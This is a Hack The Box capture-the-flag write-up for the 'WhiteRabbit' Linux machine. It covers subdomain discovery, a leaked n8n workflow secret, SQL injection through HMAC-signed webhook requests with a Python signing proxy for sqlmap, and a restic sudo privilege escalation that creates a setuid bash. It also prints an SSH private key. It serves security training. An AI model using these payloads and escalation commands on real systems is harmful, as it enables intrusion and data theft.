---
title: WhiteRabbit
date: 2025-04-12
category: Season 7
difficulty: Insane
machine: Linux
image: "htb/season7/whiterabbit/img/icon.png"
tags: ["htb", "season7", "web", "rev", "linux", "insane"]
---


### Information Gathering

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-11 10:26 EDT
Nmap scan report for whiterabbit.htb (10.10.11.63)
Host is up (0.068s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Caddy httpd
2222/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.75 seconds
```

From the scan, you can see that the machine is running Linux and that there are only 3 open ports.

The interesting thing is the second SSH service on port 2222.

I check the website hosted on port 80.
http://whiterabbit.htb/

![whiterabbit.htb-fe1](/htb/season7/whiterabbit/img/image1.png "whiterabbit.htb-fe1")

Exploring the site, it looks like a very standard front-end page.

![whiterabbit.htb-fe2](/htb/season7/whiterabbit/img/image2.png "whiterabbit.htb-fe2")

Exploring the site, it looks like a very standard front-end page.

From what you can see, it looks like a showcase site for a company doing penetration testing, displaying their tools in use such as **n8n**, **GoPhish**, and **Uptime Kuma**.

I run a directory scan to find out if there’s anything else on this website:
```bash
gobuster dir -u http://whiterabbit.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
The scan didn’t find anything...

I proceed with subdomain fuzzing:
```bash
wfuzz -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.whiterabbit.htb" --hc 404 http://whiterabbit.htb
```
All of them returned 302, but the interesting part is `status`.
```
000000314:   302        0 L      4 W        32 Ch       "status"
```
It seems it returned something extra compared to the other subdomains.

Curling that subdomain, it redirects me to `/dashboard`.
```bash
curl -v http://status.whiterabbit.htb
```
```
* Host status.whiterabbit.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.63
*   Trying 10.10.11.63:80...
* Connected to status.whiterabbit.htb (10.10.11.63) port 80
* using HTTP/1.x
> GET / HTTP/1.1
> Host: status.whiterabbit.htb
> User-Agent: curl/8.13.0-rc3
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 302 Found
< Content-Length: 32
< Content-Type: text/plain; charset=utf-8
< Date: Sat, 12 Apr 2025 14:06:28 GMT
< Location: /dashboard
< Server: Caddy
< Vary: Accept
< X-Frame-Options: SAMEORIGIN
< 
* Connection #0 to host status.whiterabbit.htb left intact
Found. Redirecting to /dashboard  
```
From the browser, it doesn't seem possible to access—most likely due to the headers. By changing to `Accept: */*`, I managed to access the **Uptime Kuma** dashboard. _(Note: this service goes down every 15 minutes!)_

As indicated on the front-end, they use this service to monitor the status of their services.

The dashboard is only accessible through authentication.

![uk-login](/htb/season7/whiterabbit/img/image3.png "uk-login")

### Vulnerability Assessment

Checking the information on this site, the latest release published on [GitHub](https://github.com/louislam/uptime-kuma/releases/tag/1.23.16) dates back to December 20, 2024, version 1.23.16.

In the changelog, a fix is mentioned for a known vulnerability:

> - [GHSA-2qgm-m29m-cj2h](https://github.com/advisories/GHSA-2qgm-m29m-cj2h "GHSA-2qgm-m29m-cj2h") [[CVE-2024-56331](https://github.com/advisories/GHSA-2qgm-m29m-cj2h "CVE-2024-56331")] Local File Inclusion (LFI) via Improper URL Handling in `Real-Browser` monitor (Thanks [@griisemine](https://github.com/griisemine))

The vulnerability seems to affect only versions from 1.23.0 up to 1.23.15 and the 2.0.0-beta.0, but authentication is required and we also don’t know if the latest version is running.

I proceed with another directory bursting on the subdomain, specifying to exclude responses with `Content-Length: 2444` since each attempt generates a custom 404 page with a 200 response code.
```bash
gobuster dir -u http://status.whiterabbit.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --exclude-length 2444
```
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://status.whiterabbit.htb/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          2444
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/screenshots          (Status: 301) [Size: 189] [--> /screenshots/]
/assets               (Status: 301) [Size: 179] [--> /assets/]
/upload               (Status: 301) [Size: 179] [--> /upload/]
/Screenshots          (Status: 301) [Size: 189] [--> /Screenshots/]
/metrics              (Status: 401) [Size: 0]
/Upload               (Status: 301) [Size: 179] [--> /Upload/]
/ScreenShots          (Status: 301) [Size: 189] [--> /ScreenShots/]
/%C0                  (Status: 400) [Size: 13]
/screenShots          (Status: 301) [Size: 189] [--> /screenShots/]
/%D3                  (Status: 400) [Size: 13]
/%CB                  (Status: 400) [Size: 13]
/%D0                  (Status: 400) [Size: 13]
/%D5                  (Status: 400) [Size: 13]
/%D7                  (Status: 400) [Size: 13]
/%D4                  (Status: 400) [Size: 13]
/%CD                  (Status: 400) [Size: 13]
/%CE                  (Status: 400) [Size: 13]
/%D8                  (Status: 400) [Size: 13]
/%CF                  (Status: 400) [Size: 13]
/%CC                  (Status: 400) [Size: 13]
/%D2                  (Status: 400) [Size: 13]
/%D1                  (Status: 400) [Size: 13]
/%CA                  (Status: 400) [Size: 13]
/%D6                  (Status: 400) [Size: 13]
/%DB                  (Status: 400) [Size: 13]
/%D9                  (Status: 400) [Size: 13]
/%C6                  (Status: 400) [Size: 13]
/%C7                  (Status: 400) [Size: 13]
/%C2                  (Status: 400) [Size: 13]
/%C1                  (Status: 400) [Size: 13]
/%DF                  (Status: 400) [Size: 13]
/%C8                  (Status: 400) [Size: 13]
/%C9                  (Status: 400) [Size: 13]
/%DD                  (Status: 400) [Size: 13]
/%DE                  (Status: 400) [Size: 13]
/%C3                  (Status: 400) [Size: 13]
/%C4                  (Status: 400) [Size: 13]
/%C5                  (Status: 400) [Size: 13]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```
From this initial scan, there aren’t many details.

The `/metrics` page is most likely an API service (?), but it requires authentication.

Since every page that wasn’t found redirected to a custom 404 page, I added a parameter to `gobuster` that excludes only the 200 response, thus allowing for a real 404.
```
/status               (Status: 404) [Size: 2444]
```

Going to the `/status` path returns a blank page.

By checking the source code on GitHub ([status-page-router.js](https://github.com/louislam/uptime-kuma/blob/master/server/routers/status-page-router.js)), `/status` is an endpoint, so I run gobuster to see what parameters are available. Among them, there is only `/status/temp`

![uk-dashboard](/htb/season7/whiterabbit/img/image4.png "uk-dashboard")

From here, it’s possible to see 2 new subdomains and a **n8n** service, but its link is missing.

On the subdomain `a668910b5514e.whiterabbit.htb` you can access the **wiki.js** service, while the other subdomain, `http://ddb09a8558c9.whiterabbit.htb/`, is the one for **gophish**.

![wikijs-1](/htb/season7/whiterabbit/img/image5.png "wikijs-1")
![gp-login](/htb/season7/whiterabbit/img/image6.png "gp-login")

Starting from **wiki.js**, you can access the `/en/gophish_webhooks` page and see a lot of sensitive information, including a download link to a JSON file containing the **n8n** workflow.

![wikijs-2](/htb/season7/whiterabbit/img/image7.png "wikijs-2")

```json
{
  "name": "Gophish to Phishing Score Database",
  "nodes": [
    {
      "parameters": {
        "respondWith": "text",
        "responseBody": "Error: No signature found in request header",
        "options": {}
      },
      "id": "c77c4304-a74e-4699-9b2c-52c7a8500fb4",
      "name": "no signature",
      "type": "n8n-nodes-base.respondToWebhook",
      "typeVersion": 1.1,
      "position": [
        660,
        620
      ]
    },
    {
      "parameters": {
        "respondWith": "text",
        "responseBody": "Error: Provided signature is not valid",
        "options": {}
      },
      "id": "da08f3e5-60c4-4898-ab28-d9f92aae2fe2",
      "name": "invalid signature",
      "type": "n8n-nodes-base.respondToWebhook",
      "typeVersion": 1.1,
      "position": [
        1380,
        540
      ]
    },
    {
      "parameters": {
        "operation": "executeQuery",
        "query": "UPDATE victims\nSET phishing_score = phishing_score + 10\nWHERE email = $1;",
        "options": {
          "queryReplacement": "={{ $json.email }}"
        }
      },
      "id": "e83be7d7-0c4a-4ca8-b341-3a40739f8825",
      "name": "Update Phishing Score for Clicked Event",
      "type": "n8n-nodes-base.mySql",
      "typeVersion": 2.4,
      "position": [
        2360,
        340
      ],
      "credentials": {
        "mySql": {
          "id": "qEqs6Hx9HRmSTg5v",
          "name": "mariadb - phishing"
        }
      }
    },
    {
      "parameters": {
        "conditions": {
          "options": {
            "caseSensitive": true,
            "leftValue": "",
            "typeValidation": "strict"
          },
          "conditions": [
            {
              "id": "ad6553f3-0e01-497a-97b5-3eba88542a11",
              "leftValue": "={{ $('Webhook').item.json.body.message }}",
              "rightValue": 0,
              "operator": {
                "type": "string",
                "operation": "exists",
                "singleValue": true
              }
            },
            {
              "id": "2a041864-d4b5-4c7d-a887-68792d576a73",
              "leftValue": "={{ $('Webhook').item.json.body.message }}",
              "rightValue": "Clicked Link",
              "operator": {
                "type": "string",
                "operation": "equals",
                "name": "filter.operator.equals"
              }
            }
          ],
          "combinator": "and"
        },
        "options": {}
      },
      "id": "c4c08710-b02c-4625-bdc3-19de5653844d",
      "name": "If Clicked",
      "type": "n8n-nodes-base.if",
      "typeVersion": 2,
      "position": [
        2120,
        320
      ]
    },
    {
      "parameters": {
        "operation": "executeQuery",
        "query": "UPDATE victims\nSET phishing_score = phishing_score + 50\nWHERE email = $1;",
        "options": {
          "queryReplacement": "={{ $json.email }}"
        }
      },
      "id": "220e3d9d-07f1-425e-a139-a51308737a89",
      "name": "Update Phishing Score for Submitted Data",
      "type": "n8n-nodes-base.mySql",
      "typeVersion": 2.4,
      "position": [
        2360,
        560
      ],
      "credentials": {
        "mySql": {
          "id": "qEqs6Hx9HRmSTg5v",
          "name": "mariadb - phishing"
        }
      }
    },
    {
      "parameters": {
        "conditions": {
          "options": {
            "caseSensitive": true,
            "leftValue": "",
            "typeValidation": "strict"
          },
          "conditions": [
            {
              "id": "ad6553f3-0e01-497a-97b5-3eba88542a11",
              "leftValue": "={{ $('Webhook').item.json.body.message }}",
              "rightValue": 0,
              "operator": {
                "type": "string",
                "operation": "exists",
                "singleValue": true
              }
            },
            {
              "id": "2a041864-d4b5-4c7d-a887-68792d576a73",
              "leftValue": "={{ $('Webhook').item.json.body.message }}",
              "rightValue": "Submitted Data",
              "operator": {
                "type": "string",
                "operation": "equals",
                "name": "filter.operator.equals"
              }
            }
          ],
          "combinator": "and"
        },
        "options": {}
      },
      "id": "9f49f588-12b7-4e3a-8d1a-74898b215d60",
      "name": "If Submitted Data",
      "type": "n8n-nodes-base.if",
      "typeVersion": 2,
      "position": [
        2120,
        500
      ]
    },
    {
      "parameters": {
        "respondWith": "text",
        "responseBody": "Success: Phishing score is updated",
        "options": {}
      },
      "id": "58eecf3c-97e9-4879-aaec-cd5759cb1ef8",
      "name": "Success",
      "type": "n8n-nodes-base.respondToWebhook",
      "typeVersion": 1.1,
      "position": [
        2660,
        460
      ]
    },
    {
      "parameters": {
        "conditions": {
          "options": {
            "caseSensitive": true,
            "leftValue": "",
            "typeValidation": "strict"
          },
          "conditions": [
            {
              "id": "8e2c34bd-a337-41e1-94a4-af319a991680",
              "leftValue": "={{ $json.signature }}",
              "rightValue": "={{ $json.calculated_signature }}",
              "operator": {
                "type": "string",
                "operation": "equals",
                "name": "filter.operator.equals"
              }
            }
          ],
          "combinator": "and"
        },
        "options": {}
      },
      "id": "8b12bac8-f513-422e-a582-99f67b87b24f",
      "name": "Compare signature",
      "type": "n8n-nodes-base.if",
      "typeVersion": 2,
      "position": [
        1100,
        340
      ]
    },
    {
      "parameters": {
        "respondWith": "text",
        "responseBody": "={{ $json.message }} | {{ JSON.stringify($json.error)}}",
        "options": {}
      },
      "id": "d3f8446a-81af-4e5a-894e-e0eab0596364",
      "name": "DEBUG: REMOVE SOON",
      "type": "n8n-nodes-base.respondToWebhook",
      "typeVersion": 1.1,
      "position": [
        1620,
        20
      ]
    },
    {
      "parameters": {
        "conditions": {
          "options": {
            "caseSensitive": true,
            "leftValue": "",
            "typeValidation": "strict"
          },
          "conditions": [
            {
              "id": "593bdf17-d38a-49a2-8431-d29679082aae",
              "leftValue": "={{ $json.headers.hasField('x-gophish-signature') }}",
              "rightValue": "true",
              "operator": {
                "type": "boolean",
                "operation": "true",
                "singleValue": true
              }
            }
          ],
          "combinator": "and"
        },
        "options": {}
      },
      "id": "0abc2e19-6ccc-4114-bf27-938b98ad5819",
      "name": "Check gophish header",
      "type": "n8n-nodes-base.if",
      "typeVersion": 2,
      "position": [
        440,
        440
      ]
    },
    {
      "parameters": {
        "jsCode": "const signatureHeader = $json.headers[\"x-gophish-signature\"];\nconst signature = signatureHeader.split('=')[1];\nreturn { json: { signature: signature, body: $json.body } };"
      },
      "id": "49aff93b-5d21-490d-a2af-95611d8f83d1",
      "name": "Extract signature",
      "type": "n8n-nodes-base.code",
      "typeVersion": 2,
      "position": [
        660,
        340
      ]
    },
    {
      "parameters": {
        "action": "hmac",
        "type": "SHA256",
        "value": "={{ JSON.stringify($json.body) }}",
        "dataPropertyName": "calculated_signature",
        "secret": "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
      },
      "id": "e406828a-0d97-44b8-8798-6d066c4a4159",
      "name": "Calculate the signature",
      "type": "n8n-nodes-base.crypto",
      "typeVersion": 1,
      "position": [
        860,
        340
      ]
    },
    {
      "parameters": {
        "conditions": {
          "options": {
            "caseSensitive": true,
            "leftValue": "",
            "typeValidation": "strict"
          },
          "conditions": [
            {
              "id": "4f69b753-a1ff-4376-88a0-032ede5d9223",
              "leftValue": "={{ $json.keys() }}",
              "rightValue": "",
              "operator": {
                "type": "array",
                "operation": "empty",
                "singleValue": true
              }
            },
            {
              "id": "9605ee34-f897-48cf-93d9-756503337686",
              "leftValue": "",
              "rightValue": "",
              "operator": {
                "type": "string",
                "operation": "equals",
                "name": "filter.operator.equals"
              }
            }
          ],
          "combinator": "and"
        },
        "options": {}
      },
      "id": "72f5d0bd-9025-4e7b-8d1f-8746035a2138",
      "name": "check if user exists in database",
      "type": "n8n-nodes-base.if",
      "typeVersion": 2,
      "position": [
        1620,
        240
      ],
      "alwaysOutputData": true,
      "executeOnce": true
    },
    {
      "parameters": {
        "operation": "executeQuery",
        "query": "SELECT * FROM victims where email = \"{{ $json.body.email }}\" LIMIT 1",
        "options": {}
      },
      "id": "5929bf85-d38b-4fdd-ae76-f0a61e2cef55",
      "name": "Get current phishing score",
      "type": "n8n-nodes-base.mySql",
      "typeVersion": 2.4,
      "position": [
        1380,
        260
      ],
      "alwaysOutputData": true,
      "retryOnFail": false,
      "executeOnce": false,
      "notesInFlow": false,
      "credentials": {
        "mySql": {
          "id": "qEqs6Hx9HRmSTg5v",
          "name": "mariadb - phishing"
        }
      },
      "onError": "continueErrorOutput"
    },
    {
      "parameters": {
        "respondWith": "text",
        "responseBody": "Info: User is not in database",
        "options": {}
      },
      "id": "e9806005-9ca3-4899-9b62-8d9d56ec413f",
      "name": "user not in database",
      "type": "n8n-nodes-base.respondToWebhook",
      "typeVersion": 1.1,
      "position": [
        1960,
        140
      ]
    },
    {
      "parameters": {
        "httpMethod": "POST",
        "path": "d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d",
        "responseMode": "responseNode",
        "options": {}
      },
      "id": "e425306c-06ba-441b-9860-170433602b1a",
      "name": "Webhook",
      "type": "n8n-nodes-base.webhook",
      "typeVersion": 2,
      "position": [
        220,
        440
      ],
      "webhookId": "d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d"
    },
    {
      "parameters": {
        "errorMessage": "User not found. This should not happen"
      },
      "id": "ec2fc3c3-014f-49b7-af14-263b2d41250d",
      "name": "Stop and Error",
      "type": "n8n-nodes-base.stopAndError",
      "typeVersion": 1,
      "position": [
        2180,
        140
      ]
    },
    {
      "parameters": {
        "errorMessage": "User not found. This should not happen"
      },
      "id": "f6d17a91-3305-488e-bb2a-79d10ec00c57",
      "name": "Stop",
      "type": "n8n-nodes-base.stopAndError",
      "typeVersion": 1,
      "position": [
        1840,
        20
      ]
    }
  ],
  "pinData": {},
  "connections": {
    "If Clicked": {
      "main": [
        [
          {
            "node": "Update Phishing Score for Clicked Event",
            "type": "main",
            "index": 0
          }
        ]
      ]
    },
    "If Submitted Data": {
      "main": [
        [
          {
            "node": "Update Phishing Score for Submitted Data",
            "type": "main",
            "index": 0
          }
        ]
      ]
    },
    "Update Phishing Score for Clicked Event": {
      "main": [
        [
          {
            "node": "Success",
            "type": "main",
            "index": 0
          }
        ]
      ]
    },
    "Update Phishing Score for Submitted Data": {
      "main": [
        [
          {
            "node": "Success",
            "type": "main",
            "index": 0
          }
        ]
      ]
    },
    "Compare signature": {
      "main": [
        [
          {
            "node": "Get current phishing score",
            "type": "main",
            "index": 0
          }
        ],
        [
          {
            "node": "invalid signature",
            "type": "main",
            "index": 0
          }
        ]
      ]
    },
    "Check gophish header": {
      "main": [
        [
          {
            "node": "Extract signature",
            "type": "main",
            "index": 0
          }
        ],
        [
          {
            "node": "no signature",
            "type": "main",
            "index": 0
          }
        ]
      ]
    },
    "Extract signature": {
      "main": [
        [
          {
            "node": "Calculate the signature",
            "type": "main",
            "index": 0
          }
        ]
      ]
    },
    "Calculate the signature": {
      "main": [
        [
          {
            "node": "Compare signature",
            "type": "main",
            "index": 0
          }
        ]
      ]
    },
    "check if user exists in database": {
      "main": [
        [
          {
            "node": "user not in database",
            "type": "main",
            "index": 0
          }
        ],
        [
          {
            "node": "If Clicked",
            "type": "main",
            "index": 0
          },
          {
            "node": "If Submitted Data",
            "type": "main",
            "index": 0
          }
        ]
      ]
    },
    "Get current phishing score": {
      "main": [
        [
          {
            "node": "check if user exists in database",
            "type": "main",
            "index": 0
          }
        ],
        [
          {
            "node": "DEBUG: REMOVE SOON",
            "type": "main",
            "index": 0
          }
        ]
      ]
    },
    "Webhook": {
      "main": [
        [
          {
            "node": "Check gophish header",
            "type": "main",
            "index": 0
          }
        ]
      ]
    },
    "user not in database": {
      "main": [
        [
          {
            "node": "Stop and Error",
            "type": "main",
            "index": 0
          }
        ]
      ]
    },
    "DEBUG: REMOVE SOON": {
      "main": [
        [
          {
            "node": "Stop",
            "type": "main",
            "index": 0
          }
        ]
      ]
    }
  },
  "active": true,
  "settings": {
    "executionOrder": "v1"
  },
  "versionId": "803dfe3a-9d37-4e37-8a74-9281cf6aad25",
  "meta": {
    "templateCredsSetupCompleted": true,
    "instanceId": "21894d8ad64e6c729da4131f6f85c4f5b635dd24a4cd990abd2d7df2c0b9c3e5"
  },
  "id": "WDCH0NwAZIztoV3u",
  "tags": [
    {
      "createdAt": "2024-08-28T11:11:04.551Z",
      "updatedAt": "2024-08-28T11:11:04.551Z",
      "id": "EXjKCJjO0OPsnJqx",
      "name": "database"
    },
    {
      "createdAt": "2024-08-28T11:11:02.744Z",
      "updatedAt": "2024-08-28T11:11:02.744Z",
      "id": "JuPt3zEtHwmK6jur",
      "name": "gophish"
    }
  ]
}
```

In short... We have the subdomain `28efa8f7df.whiterabbit.htb`, which is for **n8n**.

![n8n-login](/htb/season7/whiterabbit/img/image8.png "n8n-login")

By analyzing the JSON configuration file along with the wiki, we can understand how the workflow operates.

**n8n Workflow:**

![n8n-workflow](/htb/season7/whiterabbit/img/image9.png "n8n-workflow")
1. **Webhook initialization**
    - **"Webhook" node**
        - Receives POST requests from Gophish at the endpoint `/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d`.
2. **HMAC Signature Verification**
    - **"Extract signature" and "Calculate the signature" nodes**
        - Extract the `x-gophish-signature` from the header.
        - Recalculate the HMAC-SHA256 signature using a **hardcoded secret key** (`3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS`).
    - **"Compare signature" node**
        - Compares the received signature with the calculated one. If they don’t match, it returns `Error: Invalid Signature`.
3. **MySQL Database Interaction**
    - **"Get current phishing score" node**
        - Executes the SQL query `SELECT * FROM victims WHERE email = "{{ $json.body.email }}"`.
    - **Update nodes**
        - Update the phishing score of users with parameterized queries (but only after verifying the HMAC signature).
4. **Debug Node**
    - **"DEBUG: REMOVE SOON" node**
        - Exposes internal errors via the HTTP response (e.g., SQL error messages, payload details, etc.).
5. **Error Handling**
    - Predefined responses for cases like missing signature, etc.

From here, we can see 4 clear vulnerabilities in the JSON:
- **The HMAC key is exposed**: we can generate a valid signature and spoof requests to n8n.
- **SQL Injection in the "Get current phishing score" node**: the query is not sanitized. We can manipulate the email field.
- **Debug Node**: will help us by returning detailed errors, making it easier to craft a payload.
- **Database credentials in plaintext**: the JSON contains `mariadb - phishing` for connecting to the DB. If n8n access is compromised, these credentials are exposed.

### Exploitation

Let's create a Python script to generate our signature and start building the payload for our SQL Injection:
```python
import hmac, hashlib
secret = "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
body = '''{"campaign_id":1,"email":"\\" UNION SELECT NULL-- -","message":"Clicked Link"}'''
signature = hmac.new(secret.encode(), body.encode(), hashlib.sha256).hexdigest()
print(signature)

```

```json
{
	"campaign_id": 1,
	"email": "\" UNION SELECT NULL-- -",
	"message": "Clicked Link"
}
```

And then we send our request using Burp Suite.
```http
POST /webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d HTTP/1.1
Host: 28efa8f7df.whiterabbit.htb
x-gophish-signature: sha256=a1d4ca4a631fba4a41b8b452c9eb397d545cb7516a8ce162625cd0a7e802f8cd
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/json
Content-Length: 80

{
	"campaign_id": 1,
	"email": "\" UNION SELECT NULL-- -",
	"message": "Clicked Link"
}
```

This generates a MySQL exception:
```http
HTTP/1.1 200 OK
Content-Length: 878
Content-Type: text/html; charset=utf-8
Date: Sat, 12 Apr 2025 21:02:59 GMT
Etag: W/"36e-ttY8yOoWJ2kn7GkCQke9mOfvIDs"
Server: Caddy
Vary: Accept-Encoding

The used SELECT statements have a different number of columns | {"level":"error","tags":{},"context":{"itemIndex":0},"functionality":"regular","name":"NodeOperationError","timestamp":1744491779797,"node":{"parameters":{"resource":"database","operation":"executeQuery","query":"SELECT * FROM victims where email = \"{{ $json.body.email }}\" LIMIT 1","options":{}},"id":"5929bf85-d38b-4fdd-ae76-f0a61e2cef55","name":"Get current phishing score","type":"n8n-nodes-base.mySql","typeVersion":2.4,"position":[1380,260],"alwaysOutputData":true,"retryOnFail":false,"executeOnce":false,"notesInFlow":false,"credentials":{"mySql":{"id":"qEqs6Hx9HRmSTg5v","name":"mariadb - phishing"}},"onError":"continueErrorOutput"},"messages":[],"obfuscate":false,"description":"sql: SELECT * FROM victims where email = \"\" UNION SELECT NULL-- -\" LIMIT 1, code: ER_WRONG_NUMBER_OF_COLUMNS_IN_SELECT"}
```
The SQL Injection works. To speed things up, we can use sqlmap (don't try this at home) to automate the exploitation. To have the requests validated, we can set up a Python proxy that receives the SQLi payload generated by sqlmap, creates the signature, and sends the complete request to the server.

```python
from http.server import HTTPServer, BaseHTTPRequestHandler
import hmac
import hashlib
import requests
import json

HOST = "127.0.0.1"
PORT = 1337

secret = "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
url = "http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d"

class SQLiProxyHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)

        try:
            sqlmap_data = json.loads(post_data)
            email_payload = sqlmap_data.get('email', '*').strip('"')

            payload = {
                "campaign_id": 1,
                "email": f'"{email_payload}"',
                "message": "Clicked Link"
            }

            signature = hmac.new(
                secret.encode(), 
                json.dumps(payload, separators=(',', ':')).encode(),
                hashlib.sha256
            ).hexdigest()

            headers = {
                "x-gophish-signature": f"sha256={signature}",
                "Content-Type": "application/json"
            }
            response = requests.post(url, json=payload, headers=headers)

            self.send_response(response.status_code)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(response.content)

            print(f"\n[+] Payload inviato:", json.dumps(payload, indent=2))
            print(f"[+] Signature: {signature}")
            print(f"[+] Response: {response.status_code} - {response.text[:100]}...\n")

        except json.JSONDecodeError:
            self.send_error(400, "Invalid JSON received")
        except Exception as e:
            self.send_error(500, message=str(e))
            print(f"[!] Errore: {str(e)}")

if __name__ == "__main__":
    server = HTTPServer((HOST, PORT), SQLiProxyHandler)
    print(f"Proxy in ascolto su http://{HOST}:{PORT}")
    server.serve_forever()
```

Now, let's start the proxy and launch our sqlmap:
```bash
sqlmap -u "http://localhost:1337" --data '{"email":"*"}' --headers="Content-Type: application/json" --proxy=http://localhost:1337 --level 5 --risk 3 --dump-all --batch --thread=5 --time-sec=3
```

This takes too long to dump the entire DBMS, but during the scan, a few databases of interest appear:

- phishing
- temp

To dump only a specific table, you just need to add a flag to sqlmap: `-D <table_name>`

The `phishing` database contains the `victims` table, which is used for the SQLi. The `temp` database contains the `command_log` table.
```
Database: temp
Table: command_log
[6 entries]
```

| id  | date                | command                                                                         |
| --- | ------------------- | ------------------------------------------------------------------------------- |
| 1   | 2024-08-30 10:44:01 | `uname -a`                                                                      |
| 2   | 2024-08-30 11:58:05 | `restic init --repo rest:http://75951e6ff.whiterabbit.htb`                      |
| 3   | 2024-08-30 11:58:36 | `echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd`                        |
| 4   | 2024-08-30 11:59:02 | `rm -rf .bash_history`                                                          |
| 5   | 2024-08-30 11:59:47 | `#thatwasclose`                                                                 |
| 6   | 2024-08-30 14:40:42 | `cd /home/neo/ && /opt/neo-password-generator/neo-password-generator \| passwd` |

This is the command history. Among the information, we notice another subdomain that is a **restic** backup repository, and they've also left the password to access the repository. Another detail is that now we know the first user, `neo`, whose password was generated using `neo-password-generator`.

Let's try downloading the backup from the repository using the command:
```bash
restic -r rest:http://75951e6ff.whiterabbit.htb restore latest --target ./restore
```

We enter the password `ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw`.

```
repository 5b26a938 opened (version 2, compression level auto)
[0:00] 100.00%  5 / 5 index files loaded
restoring snapshot 272cacd5 of [/dev/shm/bob/ssh] at 2025-03-06 17:18:40.024074307 -0700 -0700 by ctrlzero@whiterabbit to ./restore
Summary: Restored 5 files/dirs (572 B) in 0:00
```

Inside, there is a 7z file `bob.7z` which is password protected. We extract the hash and try to crack it with _johntheripper_.

```bash
7z2john bob.7z > bob.7z.hash

john --wordlist=/usr/share/wordlists/rockyou.txt bob.7z.hash
```

After a while, we get the password: `1q2w3e4r5t6y`

We now have the public and private keys to access the `bob` account via `ssh` and a `config` file.
```
  HostName whiterabbit.htb
  Port 2222
  User bob
```

```bash
ssh -i bob bob@10.10.11.63 -p 2222
```

Inside, most commands are not available, except for **restic**, which does work. Furthermore, it’s possible to grant root privileges via `sudo` without requiring a password.

```
Matching Defaults entries for bob on ebdce80611e9:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User bob may run the following commands on ebdce80611e9:
    (ALL) NOPASSWD: /usr/bin/restic
```

### Privilege Escalation

restic has a `--password-command` flag that allows you to execute external commands as a password to decrypt or access a repository.

If we run the command `restic snapshots --password-command "echo password"`, it will simply print "password" in the terminal, but we can also execute other arbitrary commands.

We obtain root privileges:
```bash
sudo restic snapshots --password-command "/bin/bash -c 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash'"
```

Now, just execute `/tmp/rootbash -p` and we are system administrators.

In the `/root` directory, there are two files containing private and public keys named `morpheus` and `morpheus.pub`.
```ssh
morpheus
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQS/TfMMhsru2K1PsCWvpv3v3Ulz5cBP
UtRd9VW3U6sl0GWb0c9HR5rBMomfZgDSOtnpgv5sdTxGyidz8TqOxb0eAAAAqOeHErTnhx
K0AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL9N8wyGyu7YrU+w
Ja+m/e/dSXPlwE9S1F31VbdTqyXQZZvRz0dHmsEyiZ9mANI62emC/mx1PEbKJ3PxOo7FvR
4AAAAhAIUBairunTn6HZU/tHq+7dUjb5nqBF6dz5OOrLnwDaTfAAAADWZseEBibGFja2xp
c3QBAg==
-----END OPENSSH PRIVATE KEY-----

morpheus.pub
ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL9N8wyGyu7YrU+wJa+m/e/dSXPlwE9S1F31VbdTqyXQZZvRz0dHmsEyiZ9mANI62emC/mx1PEbKJ3PxOo7FvR4= morpheus@whiterabbit.htb
```

Now, we access the `morpheus` terminal using the key.
```bash
sudo ssh -i morpheus morpheus@10.10.11.63 -p 22
```

```bash
morpheus@whiterabbit:~$ cat user.txt
b0**********************REDACTED
```

### Lateral Movement

The next objective is to gain root access. In `/home`, among the users present on the system, we also have `neo`. As seen in the tables, neo's password was generated with a program found at `/opt/neo-password-generator`. We need to analyze it with **Ghidra** and examine the generation algorithm.

![ghidra-1](/htb/season7/whiterabbit/img/image10.png "ghidra-1")

